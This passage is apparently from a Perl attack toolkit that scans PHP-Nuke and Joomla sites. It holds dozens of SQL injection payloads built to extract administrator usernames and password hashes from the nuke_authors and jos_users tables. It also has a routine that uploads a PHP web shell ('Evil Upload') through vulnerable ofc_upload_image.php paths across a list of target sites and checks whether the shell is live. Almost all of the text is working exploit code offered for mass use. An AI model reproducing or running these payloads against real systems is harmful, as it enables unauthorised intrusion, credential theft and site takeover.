                        "modules.php?op=modload&name=EasyContent&file=index&menu=410&page_id=-1/**/union/**/select/**/0,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*","modules.php?name=Okul&op=okullar&okulid=-1/**/union/**/select/**/aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
                        "modules.php?name=Docum&op=viewarticle&artid=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%20%20/**/0,1,aid,pwd,4/**/from/**/nuke_authors/*where%20admin%20-2",
                        "modules.php?name=Inhalt&sop=listpages&cid=-1/**/union/**/select/**/aid,2/**/from/**/nuke_authors/*where%20admin%20-2",
                        "modules.php?name=Inhalt&sop=listpages&cid=-1/**/union/**/select/**/pwd,2/**/from/**/nuke_authors/*where%20admin%20-2",
                        "modules.php?name=Manuales&d_op=viewdownload&cid=1/**/union/**/select/**/0,aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
                        "modules.php?name=Siir&op=print&id=-9999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/0,aid,pwd,pwd,4/**/from+nuke_authors/*where%20admin%201%200%202",
                        "modules.php?name=NukeC&op=ViewCatg&id_catg=-1/**/union/**/select/**/pwd,2/**/from/**/nuke_authors/*where%20admin%20-2",
                        "modules.php?name=Kose_Yazilari&op=viewarticle&artid=-11223344%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0,1,aid,pwd,4,5%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors",
                        "modules.php?name=Kose_Yazilari&op=printpage&artid=-99999999%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F0,pwd,aid,3%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors",
                        "modules.php?op=modload&name=My_eGallery&file=index&do=showgall&gid=-1/**/union/**/select/**/aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*");
system('cls');
print "PhpNuke SQl Scanner\n";
print "Enter Target (http://www.target.il/)\n";
print ">>";
my $nuketarget = <>;
chomp $nuketarget;
 
foreach $Nuke(@Nuke){
my $URLL = $nuketarget.$Nuke;
my $Sourcee = get $URLL;
die "Can not get $URLL" unless defined $URLL;
if ($Sourcee =~/([0-9a-f]{32})/) { $Messagee ="Vulnerability FOUND";}
else { $Messagee = "NOT FOUND Vulnerability";}
print "$URLL     =>    $Messagee\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>Nuke.txt');
print TEXT "\n$URLL   =>   $Messagee \n\n";
close (TEXT);
}
}
if($targett eq '6')
{
system('cls');
system('title Base64 Decoder');
print color("green"),"Enter String Base64 you want Decode:";
                                                        $decode=<STDIN>;
                                                        chomp $decode;
                                                        $zeb=decode_base64($decode);
                                                        print " Decoded success : \n\n $zeb \n";
}
if($targett eq '5')
{
system('cls');
system('title Base64 Encoder');
print color("green"),"Base64 Encoder\n";
print " Enter String:";
                                                $hash=<STDIN>;
                                                chomp $hash;
                                                $t=encode_base64($hash);
                                                print "Encoded Succes : \n\n $t \n";
 
 
}
if($targett eq '1')
{
system('cls');
print color("green"),"\n[1] Joomla RCI Scanner\n";
print color("green"), "[2] Joomla SQL Scanner\n";
print color("green"), "[3] Joomla LFI Scanner\n";
print color("green"), "[4] Joomla RFI Scanner\n";
print color("green"), "[5] Joomla JCE Vuln\n";
print color("green"), "\nChoose Number :";
my $c = <>;
chomp $c;
if($c eq '1')
{  #Script Original Coded by M-A Labz
system('cls');
system('title Joomla Component RCI scanner');
print color("bold red"),"\n[+]Joomla Components RCI Exploits Scanner \n";
print color 'reset';
print color("green"),"[+] Enter File (List of site file) : ";
print color 'reset';
$file=<STDIN>;
chomp($file);
open (file, "<$file") || die "[-] Can't open the List of site file !";
my @file = <file>;
close file;
foreach $webs (@file)
{
chomp $webs;
$site = $webs;
print color("green"), "[+] Scanning $site\n";
print color 'reset';
@paths=('/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php','/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php','/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php','/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php','/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php','/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php');
foreach $path(@paths)
{
$site_vul = "http://".$site."".$path."?name=tt7.php";
$data = "php code";
$data.= ' <title>Evil Upload</title> ';
$data.= ' <h1>Evil Upload</h1> ';
$data.= '<?php ';
$data.= "echo '<b><br><br>'.php_uname().'<br></b>'; ";
$data.= 'echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\'; ';
$data.= 'echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\'; ';
$data.= "if( \$_POST['_upl'] == \"Upload\" ) { ";
$data.= "if(\@copy(\$_FILES['file']['tmp_name'], \$_FILES['file']['name'])) { echo '<b>Upload Succesfully !!!</b><br><br>'; } ";
$data.= "else { echo '<b>Upload Fail !!!</b><br><br>'; } ";
$data.= " } ";
$data.= "?>";
$res = $ua->request(POST $site_vul,Content_Type => 'text/plain', Content => $data);
if ($res->is_success){
print color("green"), "[+] $site is vul\n";
print color 'reset';
@vulns=('/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/tt7.php','/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/tt7.php','/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/tt7.php','/administrator/components/com_jinc/classes/graphics/tmp-upload-images/tt7.php','/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/tt7.php','/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/tt7.php');
foreach $vul(@vulns)
{
$url = "http://".$site. $vul;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($request);
if ($response->content=~m/<title>Evil Upload<\/title>/g){
print color("green"), "[+] Found => $url\n\n";
print color 'reset';
open(BEN,">>result-$site.txt");
print BEN "$url\n";
close(BEN);
}else{
print "[-] Not Found \n";
}
}
}
}
}
}
if($c eq '2')
{
system('cls');
system('title Joomla Sql Scanner');
###xpl###
$com_jeajaxeventcalendar="/**/UNION/**/ALL/**/SELECT/**/1,2,concat(username,0x3a,password),4/**/from/**/jos_users--";
$com_storedirectory="UNION SELECT 1,2,concat_ws(0x3a,username,email,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from jos_users";
$com_annuaire="/**/UNION/**/ALL/**/SELECT/**/1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13/**/from/**/jos_users--";
$com_maianmedia="+union+all+select+1,2,group_concat(username,char(58),password),4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+jos_users--";
$com_alfurqan15x="+UNION+ALL+SELECT+1,concat_ws(0x3a,username,0x3a,password)kaMtiEz,3,4,5+from+jos_users--";
$com_markt="+union+select+0,1,password,3,4,5,username,7,8+from+jos_users--";
$com_sponsorwall="+and+1=0+union+select+1,2,concat(username,0x3a,password)fl0rix,4,5,6,6,7,8,9,10+from+jos_users--";
$com_flipwall="+union+select+1,2,3,4,5,concat(username,0x3a,password)fl0rix,7,8,9,10+from+jos_users--";
$jedirectory="+1+union+select+1,2,concat(0x23,0x23,0x23,0x23,0x23,id,0x23,0x23,0x23,0x23,0x23),4,5,6,7,8,9,10,11+from+jos_users+where+id=userid--";
$com_ezautos="+and+0+union+select+1,2,concat(username,0x3a,password),4,5,6,7+from+%23__users+where+gid=25+or+gid=24+and+block%3C%3E1--";
$com_arash="+and 1=0 UNION SELECT 1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 from jos_users";
$com_taxes="+union+all+select+1,group_concat(username,0x3a,password,0x3a,email,0x3a,usertype),3,4,5,6,7,8,9,10,11+from+jos_users--";
$com_vat="+union+all+select+1,group_concat(username,0x3a,password),3,4,5,6,7,8,9,10,11+from+jos_users--";
$com_blogs="/**/ AND /**/ 1=2 /**/ UNION /**/ SELECT /**/ 0,1,2,3,version(),database(),concat(username,0x3a,password) /**/ from /**/ jos_users--";
$com_gr="+union+select+1,concat(username,0x3a,password)+from+jos_users--";
$com_simpleshop="UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,concat(username,0x3e,password,0x3e,usertype,0x3e,lastvisitdate)+from+jos_users--";
$com_youtube="union+select+1,concat(username,0x3a,email),3,4,5,6,7,8+from+jos_users--";
$com_joomdle="-999.9'+UNION+ALL+SELECT+1,2,3,4,5,group_concat(username,0x3a,password),7,8,9,10,11,12,13,14,15,16,17,18+from+mdl_user--+and+'kaMtiEz'='kaMtiEz";
$com_itaromry="?filter_search=&filter_level=1&filter_race=*&filter_class=8+and+1=2+union+all+select+1,2,3,4,5,6,concat(username,0x3a,password),8,9,10,11+from+jos_users--+";
$com_iproperty="/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,group_concat(username,char(58),password)v3n0m/**/from/**/jos_users--";
$com_huruhelpdesk="/**/union/**/select/**/1,2,3,concat%28username,0x3a,password%29,5,6,7+from+jos_users--";
$com_jomtube="+union+select+1,2,3,4,5,6,7,8,9,10,11,12,group_concat(username,0x3a,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27+from+jos_users--&option=com_jomtube";
$com_spa="%20UNION%20SELECT%201,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11,12,13%20from%20jos_users--";
$com_staticxt="+union select+concat_ws(0x3a,username,password),2,3,4,5,6,7,8,9,10,11,12+from+jos_users";
$com_ybggal="+and+1=2+union+all+select+1,group_concat(username,char(58),password)v3n0m,3,4,5+from+jos_users--";
$com_quran="/**/UNION/**/SELECT/**/1,group_concat(username,0x3a,password,0x3a,email,0x3a,activation,0x3c62723e)r3m1ck,3,4,5/**/FROM/**/jos_users--";
$com_konsultasi="/**/union/**/select/**/all/**/1,2,3,4,concat(username,0x3a,password)c4uR,6,7,8,9/**/from/**/jos_users--";
$com_newsfeeds="%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users--";
$wapmain="+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28+from+jos_users+limit+0,1--";
$com_abc="+union+select+1,group_concat(0x3a,username,0x3a,password,0x3a)+from+jos_users--";
$com_joomradio="+union+select+1,group_concat(username,0x3a,password),3,4,5,6,7+from+jos_users--";
$com_jtm="/**/union/**/all/**/select/**/concat_ws(0x3a,username,password)/**/from/**/jos_users--&task=search";
$com_gbufacebook="+UNION+ALL+SELECT+1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16+from+jos_users--+and+'kaMtiEz'='kaMtiEz";
$com_manager="/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,group_concat(username,char(58),password)v3n0m/**/from/**/jos_users--";
$com_jp_jobs="/**/union/**/all/**/select/**/1,2,group_concat(username,char(58),password)v3n0m,4,5,6,7,8,9,10,11,12,13,14/**/from/**/jos_users--";
$com_sermonspeaker="/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/**/";
$com_jdrugstopic="+UNION+SELECT+1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13+from+jos_users--";
$com_mv_restaurantmenumanager="+and+1=2+union+select+1,2,group_concat(username,0x3a,password),4,5,6,7,8,9,10,11,12+from+jos_users";
$com_articles="+union+select+1,2,3,4,5,concat(username,0x3a,password),7,8,9,10+from+jos_users—-";
$com_dcs_flashgames="+union+all+select+1,2,user(),4,@@version,6,concat_ws(0x3a,username,password)+from+jos_users--";
$com_bidding="+UNION ALL SELECT 1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from jos_users--";
$com_acteammember="+UNION+SELECT+1,2,3,4,5,concat(username,0x20,password),7,8,9,10,11,12,13,14,15+from+mos_users--&Itemid=121&lang=en";
$com_acstartseite="+and+1=2+union+select+1,2,concat(username,0x20,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+mos_users&#9001;=de";
$com_productbook="+UNION all SELECT 1,2,3,concat(username,0x3a,password,0x3a,email),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58+from+condev.jos_users--";
$com_yelp="+UNION+ALL+SELECT+1,2,3,concat_ws(0x3a3a3a,username,password),5,6,concat_ws(0x3a3a3a,username,password),8,9,10,11,12,13,14,15,16,17+FROM+jos_users--";
$com_dms="+union+all+select+666,666,666,666,666,666,666,concat_ws(0x3a,username,password),666,666,666,666,666,666,666,666,666,666,666,666,666+from+jos_users--";
$com_jbpublishdownfp="+union+all+select+concat(username,0x3A3A3A,password)+from+jos_users";
$com_casino="+union+all+select+1,username,password,4,5+from+jos_users/*";
$com_doqment="/**/union/**/select/**/1,2,concat(username,0x3a,password),4,5,6,7,8/**/from/**/jos_users--";
$com_alfresco="/**/union/**/select/**/1,2,3,concat(username,0x3a,password)fl0rixf0r3v3r,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21/**/from/**/jos_users--";
$com_countries="/**/union/**/select/**/concat(username,0x3a,password)fl0f0r3v3r/**/from/**/jos_users";
 
 
 
 
print color("green"),"\nTarget page: http://wwww.site.com/ : ";
chomp(my $target=<STDIN>);
 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/5.0 (compatible; MSIE 7.0; Windows)');
$host = $target . "/index.php?option=com_jeajaxeventcalendar&view=alleventlist_more&event_id=-999 .$com_jeajaxeventcalendar.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){
print "[*] Results : CHECK : \n";
print "Joomla JE Ajax Event Component (com_jeajaxeventcalendar) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_storedirectory&task=view&id=-999 .$com_storedirectory.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){
print "[*] Results : CHECK : \n";
print "Joomla Component (com_storedirectory) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_annuaire&view=annuaire&type=cat&id=-999 .$com_annuaire.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla (com_annuaire) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_maianmedia&view=music&cat=-999 .$com_maianmedia.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_maianmedia) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_alfurqan15x&action=viewayat&surano=-999 .$com_alfurqan15x.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_alfurqan15x) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_markt&page=show_category&catid=999 .$com_markt.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_markt) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_sponsorwall&controller=sponsorwall&catid=9999 .$com_sponsorwall.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_sponsorwall) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_flipwall&controller=flipwall&catid=999 .$com_flipwall.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_flipwall) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_jedirectory&view=item&catid=999 .$jedirectory.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla JE Directory SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_ezautos&Itemid=999&id=1&task=helpers&firstCode=999 .$com_ezautos.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_ezautos) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_arash&id=999 .$com_arash.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_arash) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_taxes&id=-999 .$com_taxes.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_taxes) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_vat&id=-999 .$com_vat.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_vat) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_blogs&task=details&b_id=999 .$com_blogs.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_blogs) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_blogs&task=details&b_id=-999 .$com_gr.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_gr) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_simpleshop&Itemid=xx&task=viewprod&id=-999 .$com_simpleshop.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_simpleshop) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_youtube&id_cate=999 .$com_youtube.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_youtube) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_joomdle&view=detail&cat_id=1&course_id=.$com_joomdle.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_joomdle) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_itarmory&view=guildmembers&Itemid=.$com_itarmory.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_itarmory) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_iproperty&view=agentproperties&id=-999999 .$com_iproperty.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_iproperty) SQL Injection Vulnerability ! \n\n";
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_huruhelpdesk&view=detail&cid[0]=999 .$com_huruhelpdesk.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_huruhelpdesk) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?view=videos&type=member&user_id=-999 .$com_jomtube.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_jomtube) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_spa&view=spa_read_more&pid=-999 .$com_spa.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_spa) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_staticxt&staticfile=test.php&id=-999 .$com_staticxt.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_staticxt) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_ybggal&Itemid=999&catid=999 .$com_ybggal.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_ybggal) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_quran&action=viewayat&surano=999 .$com_quran.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_quran) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_konsultasi&act=detail&sid=999 .$com_konsultasi.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_konsultasi) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_newsfeeds&view=categories&feedid=-999 .$com_newsfeeds.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_newsfeeds) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/wap/wapmain.php?option=onews&action=link&id=-999 .$wapmain.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (wapmain.php) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_abc&view=abc&letter=AS&sectionid=-999 .$com_abc.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_abc) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index2.php?option=com_joomradio&page=show_video&id=-999 .$com_joomradio.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_joomradio) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_jtm&view=search&view=search&author=-999 .$com_jtm.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component JTM Reseller SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_gbufacebook&task=show_face&face_id=-999 .$com_gbufacebook.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_gbufacebook) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_manager&view=flight&Itemid=999 .$com_manager.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_manager) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_jp_jobs&view=detail&id=-999 .$com_jp_jobs.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_jp_jobs) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_sermonspeaker&task=latest_sermons&id=-999 .$com_sermonspeaker.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_sermonspeaker) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_jdrugstopics&view=drugsdetails&id=-999 .$com_jdrugstopics.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_jdrugstopics) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_mv_restaurantmenumanager&task=menu_display&Venue=1&mid=999 .$com_mv_restaurantmenumanager.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_mv_restaurantmenumanager) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_articles&task=view_addarticles&sid=999 .$com_articles.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_articles) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_dcs_flashgames&Itemid=61&catid=999 .$com_dcs_flashgames.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_dcs_flashgames) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_bidding&id=-999 .$com_bidding.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_bidding) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_acteammember&id=-999 .$com_acteammember.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_acteammember) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_acstartseite&Itemid=999 .$com_acstartseite.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_acstartseite) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_productbook&Itemid=999&func=detail&id=-999 .$com_productbook.";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-f]{32})/){+
print "[*] Results : CHECK : \n";
print "Joomla Component (com_productbook) SQL Injection Vulnerability ! \n\n"
}
else{print "\n[-] Error\n";
}
 
$host = $target . "/index.php?option=com_yelp&controller=showdetail&task=showdetail&cid=-999 .$com_yelp.";
$res = $b->request(HTTP::Request->new(GET=>$host));
